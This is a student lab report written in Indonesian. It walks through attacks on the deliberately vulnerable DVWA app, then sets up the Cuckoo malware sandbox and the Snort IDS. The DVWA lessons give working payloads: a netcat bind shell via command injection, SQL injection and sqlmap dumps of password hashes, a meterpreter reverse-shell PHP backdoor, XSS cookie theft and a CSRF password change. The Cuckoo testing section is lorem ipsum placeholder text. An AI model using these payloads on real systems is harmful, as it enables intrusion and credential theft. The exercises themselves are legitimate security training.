# Anggota Kelompok 9

1. 5114100031 ANDRE EXAUDI JEREMY RUMAPEA
2. 5114100043 JEFFRY NASRI FARUKI
3. 5114100073 HENDRA DARMAWAN

# Daftar Isi
1. [DVWA](#dvwa)
* [Konfigurasi](#konfigurasi)
* [Lesson-4](#lesson-4-using-metasploit-with-command-execution)
* [Lesson-5](#lesson-5-using-tamper-data-with-crack_web_formpl)
* [Lesson-6](#lesson-6-manual-sql-injection-john-the-ripper)
* [Lesson-7](#lesson-7-automate-sql-injection-with-sqlmap)
* [Lesson-8](#lesson-8-upload-php-backdoor-payload)
* [Lesson-9](#lesson-9-cross-site-scripting-xss)
* [Lesson-10](#lesson-10-cross-site-request-forgery-combined-with-curl)
2. [Cuckoo](#cuckoo)
* [Instalasi](#instalasi)
* [Konfigurasi](#konfigurasi-1)
* [Testing](#testing-1)
3. [Snort](#snort)
* [Instalasi](#instalasi-pada-windows)
* [Konfigurasi](#konfigurasi-2)
* [Testing](#testing-2)

# Pendahuluan

Dalam laporan berisi cara penggunaan DVWA, Cuckoo dan Snort. DVWA adalah singkatan dari Damn Vulnerable Web Application, DVWA sendiri merupakan sebuah website yang sudah dirancang sedemikian rupa sehingga memiliki banyak celah keamanan untuk di explore. Cuckoo adalah sistem penganalisa malware. Snort adalah sistem penganalisa paket. Laporan ini akan berisi instalasi,konfigurasi dan beberapa seknario percobaan masing-masing aplikasi tersebut

# DVWA
Prerequisite:
1. Iso Backtrack 5 GNOME 64 bit
2. Iso Metasploitable-linux-2.0.0
3. Iso Ubuntu Dekstop 16.04
4. Windows 7/8/10
## Konfigurasi

1. Buat DHCP server pada VMWare dengan mengetikkan perintah berikut di cmd
```
VBoxManage dhcpserver add --netname intnet --ip 10.0.1.1 --netmask 255.255.255.0 --lowerip 10.0.1.100 --upperip 10.0.1.200  --enable
```
Ket = perintah di atas akan memberi ip address dalam rentang 10.0.1.100 sampai 10.0.1.200
2. Setting Network Virtual OS Metsploitable
Klik Kanan Virtual OS -> Setting -> Buka Tab Network -> isi Attached Netwrok : Internal Network dan Name : intnet(nama dhcp server Langkah 1)

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/1.PNG)

Jika Berhasil , maka akan didapatkan ip dalam rentang 10.0.1.100 sampai 10.0.1.200 :

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/2.PNG)

3. Lakukan Hal tersebut pada Virtual OS backtrack dan viertual OS ubuntu
4. Setting security DVWA menjadi Low
Buka ip Virtual OS metasploitable pada browser di virtual OS Ubuntu. contoh = 10.0.1.100/dvwa

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/3.PNG)

Login dengan username : admin , password : password

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/4.PNG)

Klik Tab DVWA Security, Pilih Low, SUBMIT

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/5.PNG)
## Testing
### Lesson 4: Using Metasploit with Command Execution

1. Jalankan Netcat pada Metasploit
Klik tab Command Execution

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/6.PNG)

Jalankan perintah
```
http://10.0.1.100;mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe
```
Ket = 10.0.1.100 -> ip Metasploitable
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/7.PNG)

2. Start VIrtual OS backtrack, login dengan username : root, password: toor
3. Buka start Menu ->BackTrack->Exploitation Tools->Network Exploitation tool->Metasploit Framework -> msf console
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/8.PNG)

4. Jalankan perintah-perintah berikut secara bergantian
```
use multi/handler
set PAYLOAD linux/x86/shell/bind_tcp
show options
set RHOST 10.0.1.100
```

5. Jalankan perintah 
```
exploit
```

### Lesson 5: Using Tamper Data with crack_web_form.pl

1. Enable add on Tamper Data pada firefox di Backtrack
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/9.PNG)

2. Buka Halaman DVWA dengan firefox di Backtrack
3. Start Add on Tamper Data (Firefox->Tools->Tamper Data -> STart Tamper)

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/10.PNG)
4. Login dengan akun username : admin dan password : password pada halaman DVWA
5. AKan muncul notifikasi Sumbit tamper data. Uncheck textbox dan klik submit

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/11.PNG)

6. Copy data POSTDATA dalam REQUEST HEADER padasalah satu data yang method-nya POST

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/12.PNG)

7. copy data tersebut pada notepad
8. Login sekali lagi dengan username dan password yang salah
9. AKan muncul tulisan Login FAiled . masukkan tulisan ini pada notepad sebelumnya bersamaan dengan data POSTDATA
10. Buat direktory pentest/password/cwf
11. download http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson5/cwf.tar.gz , masukkan dalam folder tersebut
12. JALankan perintah-perintah berikut secara berurutan
```
    cd /pentest/passwords/cwf
    ls -l
    tar xovfz cwf.tar.gz
    chmod 700 crack_web_form.pl
```
13. Jalankan perintah :
```
./crack_web_form.pl -U admin -P password.txt -http "10.0.1.100/dvwa/login.php" -data "username=USERNAME&password=PASSWORD&Login=Login" -M "Login failed"
```
Ket: 10.0.1.100->IP metasploitable

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/13.PNG)
### Lesson 6: Manual SQL Injection, John the Ripper

1. Login KE DVWA. Buka menu SQL Injection
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/14.PNG)
2. Skenario Basic Injection
Masukkan perintah berikut di kolom SQL Injection
```
1
```
3. Skenario Always True
Masukkan perintah berikut di kolom SQL Injection
```
%' or '0'='0
```
4. Menampilkan versi Database
Masukkan perintah berikut di kolom SQL Injection
```
%' or 0=0 union select null, version() #
```
5. Menampilkan User Database 
Masukkan perintah berikut di kolom SQL Injection
```
%' or 0=0 union select null, user() #
```
6. Menampilkan Nama Database
Masukkan perintah berikut di kolom SQL Injection
```
%' or 0=0 union select null, database() #
```
7. Menampilkan semua tabel di information_schema
Masukkan perintah berikut di kolom SQL Injection
```
%' and 1=0 union select null, table_name from information_schema.tables #
```
8. Menampilkan semua pengguna di tabel information_schema
Masukkan perintah berikut di kolom SQL Injection
```
%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
```
9. Menmpilkan kolom di tabel information_schema
Masukkan perintah berikut di kolom SQL Injection
```
%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
```
10. Menampilkan kolom dan konten tabel di information_schema
Masukkan perintah berikut di kolom SQL Injection
```
%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
```
11. Membuat password hash file
Data yang didapatkan dari langkah ke-10 simpan di notepad taruh di folder /pentest/password/john dengan format seperti gambar di bawah

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/15.PNG)

Jalankan perintah berikut untuk mencrypt password yg terenkripsi
```
cd /pentest/passwords/john
./john --format=raw-MD5 dvwa_password.txt
```



### Lesson 7: Automate SQL Injection with SqlMap

1. Login ke DVWA dan buka menu SQL INjection
2. Start add On tamper data
3. MAsukkan angka 1 di kolom sql injection, maka akan muncul notifikasi submit. uncheck checkbox
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/16.PNG)
4. Catat data REferrer dan data Cookiedari salah satu paket GET
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/17.PNG)
5. Buka folder SQLMAP pada terminal dengan mengetik
```
cd /pentest/web/scanners/sqlmap
```
6. Menggunakan sqlmap meandapatkan database dan user yang digunakan
```
/sqlmap.py -u "http://10.0.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" -b --current-db --current-user
```
Ket : sesuaikan data dengan langkah ke 4

jika ada pemrtanyaan, pilih yes. Setelah proses selesai, hasilnya kan sepertin ini :

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/18.PNG)

Data tersebut merupakan database yang sedang digunakan

8. Menggunakan sqlmap untuk dapatkan semua database yang ada

Jalankan perintah :
```
./sqlmap.py -u "http://10.0.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" --dbs
```
Ket : sesuaikan data dengan langkah ke 4

Jika berhasil maka akan seperti gambar di bawah ini :

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/19.PNG)

9. MEnggunakan sqlmap untuk dapatkan isi username dan password database DVWA
```
./sqlmap.py -u "http://10.0.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" -D dvwa --tables
```
Ket : sesuaikan data dengan langkah ke 4

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/20.PNG)
Jalankan perintah :
```
./sqlmap.py -u "http://10.0.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" -D dvwa -T users --columns
```
Ket : sesuaikan data dengan langkah ke 4
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/21.PNG)
Jalankan perintah :
```
./sqlmap.py -u "http://10.0.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" -D dvwa -T users -C user,password --dump
```
Ket : sesuaikan data dengan langkah ke 4
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/22.PNG)
### Lesson 8: Upload PHP Backdoor Payload

1. Jalankan perintah :
```

    mkdir -p /root/backdoor
    cd /root/backdoor
    msfpayload php/meterpreter/reverse_tcp LHOST=10.0.1.102 LPORT=4444 R > PHONE_HOME.php
    ls -l PHONE_HOME.php

```
Ket = 10.0.1.102 ip backtrack

2. Buka file PHONE_HOME.php , dan hilangkan tanda # di baris awal file
3. Buka terminal dan ketikkan msfconsole
4. Jalankan perintah berikut
```
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 10.0.1.102
set LPORT 4444
exploit
```
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/23.PNG)

5. Login ke DVWA, Masuk ke menu Upload. dan upload PHONE_HOME.php. Jika berhasil akan seperti gambar :
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/24.PNG)

6. Buka http://10.0.1.100/dvwa/hackable/uploads/ dan klik PHONE_HOME.php. Jika berhasil akan seperti gambar

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/25.PNG)

7. Jalankan perintah :
```
    shell        
    uptime
    pwd
    whoami
    w
    echo "Hacked By PKSJ" > hacked.html
    ls -l
```
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/26.PNG)
8. Jika berhasil maka file hacked.html sudah ada di DVWA

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/27.PNG)
### Lesson 9: Cross Site Scripting (XSS)

1. Ubah limit script guna melancarkan aksi
Buka metasploitable dan ketikkan perintah berikut :
```
cd /var/www/dvwa/vulnerabilities/xss_s/
vi index.php
```
cari kata mtxMessage di vi dengan mengetik kan:
```
/mtxMessage
```
ubah maxlength yang awalnya 50 mejadi 250

2. Di firefox BAcktrack  matikan fitur BLOCK POP UP WINDOWS dan nyalakan fitur ENABLE JAVASCRIPT
3. SKenario expolit IFRAME di XSS STORED
Login ke DVWA buka menu XSS STORED. ISi seperti di bawah ini :
```
    Name: Test 2
    Message: <iframe src="http://www.cnn.com"></iframe>
    Click Sign Guestbook
```
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/28.PNG)

4. SKenario expolit COOKIE di XSS STORED
Login ke DVWA buka menu XSS STORED. ISi seperti di bawah ini :
```
    Name: Test 3
    Message: <script>alert(document.cookie)</script>
    Click Sign Guestbook
```
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/29.PNG)
5. SKenario expolit windows.location di XSS STORED
Ketikkan perintah berikut
```
mkdir -p /root/backdoor
cd /root/backdoor
msfpayload php/meterpreter/reverse_tcp LHOST=10.0.100.102 LPORT=4444 R > FORUM_BUG.php 
```
Hilangkan tanda # di file FORUM_BUG.php
Login ke DVWA buka menu upload, upload file FORUM_BUG.php
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/30.PNG)
Buka msfconsole dan ketikkan perintah berikut
```
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 10.0.100.102
set LPORT 4444
exploit 
```
buka menu XSS STORED. ISi seperti di bawah ini :
```
    Name: Test 4
    Message:

    <script>window.location="http://192.168.1.106/dvwa/hackable/uploads/FORUM_BUG.php" </script>
        Replace 192.168.1.106 with the IP Address obtain from Fedora 14 in (Section 3, Step 3).

    Click Sign Guestbook
```
Jika berhasil , maka di msf console akan berubah jadi gambar berikut :
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/31.PNG)
### Lesson 10: Cross Site Request Forgery combined with Curl

1. Login ke DVWA, buka menu CSRF. ISi kolom new password dan kolom confirm new password untuk mendapatkan url seperti ini :
```
"http://10.0.1.100/dvwa/vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change#"
```

2. Buka menu XSS reflected. Ketikkan perintah berikut :
```
<script>alert(document.cookie)</script>
```

3. AKan muncul alert box, kopi isi dari aler box tersebut. ISinya akan terlihat seperti di bawah ini :
```
security=low; PHPSESSID=3juclcme0enmmhns9t36mi4ij0
```

4. Buka terminal, ketikkan perintah berikut secara berurutan :
```
curl --cookie "security=low; PHPSESSID=3juclcme0enmmhns9t36mi4ij0" --location "http://10.0.1.100/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#" | grep "Password Changed" | tee curl.txt
```
Ket = isi cookie dan location diisi sesuai dengan langkah 1 dan 3

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/32.PNG)

5. Coba login ke DVWA dengan password yang dirubah. Jika berhasil, sukses


# CUCKOO
## Instalasi
Panduan:
```
Buku Cuckoo Malware Analysis
Video Youtube: Automated Malware Analysis with Cuckoo
```
### Pendahuluan
Pada instalasi Cuckoo ini kami menggunakan dua OS, satu sebagai Host dan satu sebagai Guest. Kami menggunakan Ubuntu versi 16.04 LTS 64bit sebagai Host dan Windows XP SP3 32bit sebagai Guest. Berikut merukapan langkah instalasi kedua OS dan Cuckoo:
1. Instalasi OS Ubuntu di virtualbox seperti tugas 1 dan 2. Kemudian jalankan Linux seperti biasa

2. Aktifkan Shared Files pada Machine > Settings, pilih Shared Folder dan klik tambah shared folder baru. Kemudian akan muncul dialog box, masukkan folder yang akan di share pada folder path, kemudian centang ketiga option(folder merupakan folder utama windows, disini contoh menggunakan Windows 8.1)
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/33.PNG)

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/34.PNG)

3. Install Guest Addition CD Image pada Ubuntu, kemudian restart ubuntu setelah selesai

4. Masukkan perintah berikut untuk menambahkan user agar mendapatkan permission untuk melihat isi folder
```
sudo adduser (nama user) vboxsf
```
Restart Ubuntu.

5. Step 2-4 merupakan step optional, berguna jika user telah terlanjur mendownload file iso Windows XP pada OS utama. Step 2-4 akan digunakan pada Host dan Guest OS untuk sharing file.

6. Install Virtualbox pada Ubuntu dengan perintah
```
sudo apt-get update
sudo apt-get install virtualbox
```
### Instalasi Program Tambahan
Install aplikasi-aplikasi yang akan dibutuhkan Cuckoo nantinya. Berikut tata cara penginstalan aplikasi yang dibutuhkan oleh Cuckoo:
1. Install Python dengan perintah:
```
sudo apt-get install python
```
2. Install SqlAchemy sebagai toolkit database untuk python dengan perintah:
```
sudo apt-get install python-sqlalchemy
```
### Instalasi Program Optional
Install aplikasi-aplikasi berikut ini untuk memperlancar running dari Cuckoo
1. Berikut merupakan beberapa program atau modul yang kemungkinan besar akan dibutuhkan, yaitu:
-dpkt
-jinja2
-magic
-ssdeep
-pydeep
-pymongo
-yara dan yara python
-libvirt
-bottlepy
-pefile
Semua modul tersebut bisa diinstall dalam 1 line baris berikut:
```
sudo apt-get install python-dpkt python-jinja2 python-magic python-pymongo python-libvirt python-bottle python-pefile ssdeep
```
2. Install dependencies dengan perintah:
```
sudo apt-get install build-essential git libpcre3 libpcre3-dev libpcre++-dev
```
3. Install pydeep dengan cara clone dari git source dan masukkan ke opt folder:
```
cd /opt
git clone https://github.com/kbandla/pydeep.git pydeep
cd /opt/pydeep/
sudo python setup.py build
sudo python setup.py install
```
4. Install Yara tetap dalam folder /opt dengan perintah berikut:
```
git clone --recursive https://github.com/VirusTotal/yara-python
cd yara-python
sudo python setup.py build
sudo python setup.py install
```
5. Install tcpdump dengan perintah berikut:
```
sudo apt-get install tcpdump
```
### Instalasi Cuckoo
Install Cuckoo di Host OS, ada dua cara untuk melakukan instalasi ini, pertama download manual, atau melalui git clone. Untuk instalasi melalui git clone masukkan perintah ini pada folder home:
```
git clone git://github.com/cuckoobox/cuckoo.git
```

## Konfigurasi
### Pendahuluan
Install Windows XP pada virtualbox yang telah di download pada ubuntu. Alokasikan memory hard drive sekitar 10GB.

### Konfigurasi Network
1. Setelah berhasil melakukan penginstalan. Buka File > Preferences (dalam keadaan windows xp mati), kemudian pilih network, dan tambahkan host-only network.

2. Kemudian klik kanan pada Guest OS, pilih Settings, Network kemudian ganti menjadi Host-only Adapter.

3. Buat Shared Folder antara Guest OS dengan Host OS dengan cara yang sama pada bagian Instalasi.

4. Dalam Windows XP, klik Start, kemudian klik kanan pada My Computer, pilih Map Network Drive

5. Pilih Drive yang diinginkan, kemudian pada bagian volder isikan \\vboxsrv\(nama folder di host). Step 4 dan 5 bisa di skip, karena pada saat kami melakukan step ini ternyata secara otomatis windows telah menampilkan shared folder.

6. Install Python dan PIL (Python Imaging Libary) pada Windows XP.

7. Matikan firewall, antivirus, dan auto-update pada Windows XP.

8. Copy file python agent.py pada ubuntu ke dalam Share Folder, file bisa ditemukan pada direktori penginstalan Cuckoo.

9. Pindahkan file kedalam C:/Python27, kemudian rename file menjadi Agent.pyw. Jalankan file tersebut.

10. Copy file Agent.pyw ke dalam C:\Documents and Settings\(nama user)\Start Menu\Programs\Startup.

11. Akan ada socket baru yang melakukan listening kepada 0.0.0.0:8000, bisa di cek dengan memasukkan perintah berikut ini pada command line:
```
netstat –aon
```

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/35.png)

12. Atur dorwarding dan fitering dari Host OS dengan perintah berikut ini:
```
sudo iptables -A FORWARD -o eth0 -i vboxnet0 -s 192.168.56.0/24 -m conntrack --ctstate NEW -j ACCEPT 
sudo iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT 
sudo iptables -A POSTROUTING -t nat -j MASQUERADE 
sudo sysctl -w net.ipv4.ip_forward=1 
```

## Testing

"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

# SNORT
## Instalasi pada Windows

1. Unduh installer Snort 2.9.11 dari [https://www.snort.org/downloads](https://www.snort.org/downloads)
2. Unduh rules untuk Snort dari [https://www.snort.org/downloads/#rule-downloads](https://www.snort.org/downloads/#rule-downloads) sebelumnya daftar terlebih dahulu supaya dapat mengunduh snortrules-snapshot-29110.tar.gz.
3. Install WinPcap 4.1.3 dari [https://www.winpcap.org/install/default.htm](https://www.winpcap.org/install/default.htm) apabila belum terinstall di Windows. Tidak ada konfigurasi yang perlu dilakukan saat instalasi.
4. Jalankan installer Snort yang sudah diunduh sebelumnya.
- Accept license agreement.
- Pilih komponen yang diperlukan, dalam hal ini dicentang semua (snort, dynamic modules, documentation). Klik OK.
- Pilih root directory untuk Snort, kita akan menggunakan default root directory c:\Snort.
- Pada saat akhir, akan muncul window yang menyuruh kita untuk mengunduh WinPcap 4.1.1 walaupun versi yang sekarang sudah 4.1.3, jadi diabaikan saja. Klik OK.
5. Extract rules yang sudah diunduh sebelumnya.
- Extract isi folder rules ke c:\Snort\rules.
- Extract isi folder preproc_rules ke c:\Snort\preproc_rules.
- Sisanya diabaikan saja.
6. Untuk mengecek apakah Snort sudah berfungsi
- ketik **cd c:\Snort\bin** kemudian enter
- ketik **snort -V**, akan muncul versi Snort yang kita gunakan

![image](https://user-images.githubusercontent.com/29043129/34213075-ce324358-e5d0-11e7-9855-722b6f1f54a8.png)


## Konfigurasi

1. Buka file C:\Snort\etc\snort.conf
2. Pada HOME_NET, kita akan mengganti range IP yang akan kita protect sebagai Home.  Buka Command Prompt, dan ketik ipconfig:
![image](https://user-images.githubusercontent.com/29043129/34206527-772012be-e5b9-11e7-941b-dc0d5ee8230d.png)
Pada Wireless LAN adapter Wi-Fi kita mendapatkan network yang akan kita protect, kemudian ganti **any** menjadi **192.168.1.1/24**
3. Kemudian pada EXTERNAL_NET, selain network yang kita protect akan kita anggap sebagai external, jadi ganti **any** menjadi **!$HOME_NET**
4. Pada RULE_PATH ganti **../rules** menjadi **c:\Snort\rules**
5. Pada PREPROC_RULE_PATH ganti **../preproc_rules** menjadi **c:\Snort\preproc_rules**
6. Comment bagian SO_RULE_PATH
7. Comment juga bagian WHITE_LIST_PATH & BLACK_LIST_PATH
8. Untuk default log directory, uncomment **config logdir:** dan beri nilai **c:\Snort\log**
9. Uncomment config logdir dan beri nilai c:\Snort\log
10. Pada bagian dynamicpreprocessor directory ganti **/usr/local/lib/snort_dynamicpreprocessor/** menjadi **c:\Snort\lib\snort_dynamicpreprocessor**
11. Pada bagian dynamicengine ganti **/usr/local/lib/snort_dynamicengine/libsf_engine.so** menjadi **c:\Snort\lib\snort_dynamicengine\sf_engine.dll** 
12. Comment bagian dynamicdetection directory
13. Comment bagian 
**
preprocessor normalize_ip4
preprocessor normalize_tcp: ips ecn stream
preprocessor normalize_icmp4
preprocessor normalize_ip6
preprocessor normalize_icmp6**
14. Comment bagian 
**
preprocessor reputation: \
memcap 500, \
priority whitelist, \
nested_ip inner, \
whitelist $WHITE_LIST_PATH/white_list.rules, \
blacklist $BLACK_LIST_PATH/black_list.rules**
15. Uncomment bagian
**include $PREPROC_RULE_PATH/preprocessor.rules
include $PREPROC_RULE_PATH/decoder.rules
include $PREPROC_RULE_PATH/sensitive-data.rules**

## Testing

### membaca pcap dari SECREPO (Security Data Samples Repository)

1. Buka [Secrepo](http://www.secrepo.com/), pilih [Awesome Industrial Control System](https://github.com/hslatman/awesome-industrial-control-system-security)
2. Download [PCAPS from the 23rd DEF CON](https://media.defcon.org/DEF%20CON%2023/DEF%20CON%2023%20villages/DEF%20CON%2023%20ics%20village/DEF%20CON%2023%20ICS%20Village%20packet%20captures.rar). Extract file tersebut di folder Downloads
3. Run command prompt as administrator
4. Ketik **cd C:\Snort\bin**, tekan enter
5. Ketik **Snort -r C:\Users\Jason\Downloads\DEF CON 23 ICS Village packet captures.pcap** , tekan enter
6. Berikut hasilnya
![image](https://user-images.githubusercontent.com/29043129/34211644-54278dec-e5cc-11e7-9cd7-fb16d74a2a04.png)
![image](https://user-images.githubusercontent.com/29043129/34211651-5aa5eeb6-e5cc-11e7-97dc-d4ef231353f9.png)

# Refrensi
  * http://www.computersecuritystudent.com/cgi-bin/CSS/process_request_v3.pl?HID=688b0913be93a4d95daed400990c4745&TYPE=SUB
  
